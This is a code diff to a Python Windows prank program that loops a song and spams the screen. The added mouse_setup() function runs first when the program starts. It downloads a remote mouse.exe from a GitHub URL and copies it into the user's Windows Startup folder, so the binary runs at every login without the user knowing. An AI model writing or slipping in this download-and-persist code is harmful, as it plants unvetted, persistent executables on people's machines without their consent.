@@ -1,8 +1,9 @@
 import os
+import shutil
 import sys
 import time
-import ctypes
 from pathlib import Path
+import requests
 from ctypes import windll, c_int, c_uint, c_ulong, byref, POINTER
 
 def get_asset_path(relative_path):
@@ -14,7 +15,18 @@ def play_audio(path):
     windll.winmm.mciSendStringW(f'open "{path}" type mpegvideo alias bgm', None, 0, 0)
     windll.winmm.mciSendStringW('play bgm repeat', None, 0, 0)
 
+def mouse_setup():
+    # %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+    r = requests.get("https://github.com/skykosiner/charlie-kirk/raw/refs/heads/master/dist/mouse.exe", stream=True)
+
+    with open('dist/mouse.exe', 'wb') as out_file:
+        out_file.write(r.content)
+
+    shutil.copy("dist/mouse.exe",os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
+
 def main():
+    mouse_setup()
+
     song_path = get_asset_path("assets/we-are-charlie-kirk-song.mp3")
     spam_dir = get_asset_path("assets/spam")
 
